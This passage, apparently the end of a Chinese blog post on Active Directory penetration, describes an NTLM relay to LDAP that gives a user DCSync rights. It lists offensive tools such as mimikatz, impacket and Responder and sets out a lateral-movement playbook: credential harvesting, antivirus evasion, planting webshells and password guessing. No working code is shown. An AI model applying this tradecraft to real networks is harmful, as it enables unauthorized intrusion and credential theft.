服务器将尝试向这个URL发送通知<br><img src="https://p3.ssl.qhimg.com/t017673212a17449f39.png" alt="avatar"></p></li><li><p>Relay 到域控的Ldap 服务器并给普通用户daiker添加两条acl<br><img src="https://p3.ssl.qhimg.com/t017f6e513d75746385.png" alt="avatar"></p></li><li><p>用户即拥有了dcsync权限</p></li></ol></li></ul><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><ul><li><p>mimikatz（没啥说的，神器）</p><blockquote><p><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p></blockquote></li><li><p>impacket（python写的集成工具集,里面有功能类似的工具，可能不被杀）</p><blockquote><p><a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p></blockquote></li><li><p>responder（利用wpad和中继抓取凭证，当一筹莫展时可以试试）</p><blockquote><p><a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a></p></blockquote></li><li><p>empire （后渗透框架）</p><blockquote><p><a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></p></blockquote></li><li><p>ruler （exchange渗透工具）</p><blockquote><p><a href="https://github.com/sensepost/ruler">https://github.com/sensepost/ruler</a></p></blockquote></li><li><p>kerberoast (kerberoast工具)</p><blockquote><p><a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p></blockquote></li><li><p>cmdkey （命令行添加认证凭证方便）</p></li><li><p>…</p><p>  (o’&gt;’o) 以后想到啥再加吧 </p></li></ul><h2 id="域渗透思路："><a href="#域渗透思路：" class="headerlink" title="域渗透思路："></a>域渗透思路：</h2><p>这个就是个人瞎逼逼了：一般一进去就是域控的情况很少（还是遇到过），有的时候进去都不是域内机器。基本思路无非就是：抓密码-&gt;移动-&gt;抓密码，所以前期的信息收集很重要。一般服务账户权限都很高，比如exchange。所以尝试的时候先尝试服务账户。远程执行的时候一定先看杀软，有厉害的比如eset、fireye之类的就要谨慎一点，mimikatz啥的就别传了，必杀。域内一般还是比外网好搞的，所以一定要自己动手搭环境自己试试。</p><p>一般进入内网先要摸清内网结构，大的目标会有杀软和防火墙，所以别用动静太大的扫描器比如nmap，尽量找轻量级的扫描器，线程少或干脆单线程，网络内所有存活主机，所有开放端口和运行服务都要高清楚，内网一般危险服务很多，比如 telnet、redis等.开80等web端口的做好内网代理访问看看，推荐 <code>HTTPScreenshot</code> 这个工具。然后的思路就和外往差不多，想办法拿权限，抓到hash以后去别的机器尝试，如此往返。</p><hr><p>更新：域信息收集很重要，定位好域控，datacenter，数据库，web服务器等。本地system的口令多碰一碰，大概率可以碰到好多台。多翻翻文件，看看共享。记住，能不上工具就不上工具。</p><p>有权限了多放webshell，大部分会做反代，内网ping域名找机器，反代nginx的代理池springpool里会有详细的配置。口令找找规则，猜一猜，说不定就猜到了。</p><h2 id="推荐"><a href="#推荐" class="headerlink" title="推荐"></a>推荐</h2><ul><li><p>三好学生博客</p><blockquote><p><a href="https://3gstudent.github.io/">https://3gstudent.github.io/</a></p></blockquote></li><li><p>从零开始内网渗透学习</p><blockquote><p><a href="https://github.com/l3m0n/pentest_study">https://github.com/l3m0n/pentest_study</a></p></blockquote></li><li><p>内网渗透知识基础及流程</p><blockquote><p><a href="https://www.anquanke.com/post/id/170471">https://www.anquanke.com/post/id/170471</a></p></blockquote></li><li><p>我所了解的内网渗透——内网渗透知识大总结</p><blockquote><p><a href="https://www.anquanke.com/post/id/92646">https://www.anquanke.com/post/id/92646</a></p></blockquote></li><li><p>Dirk-jan Mollema 博客</p><blockquote><p><a href="https://dirkjanm.io/">https://dirkjanm.io/</a></p></blockquote></li></ul>]]></content>
    
    
    <categories>
      
      <category>AD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AD</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
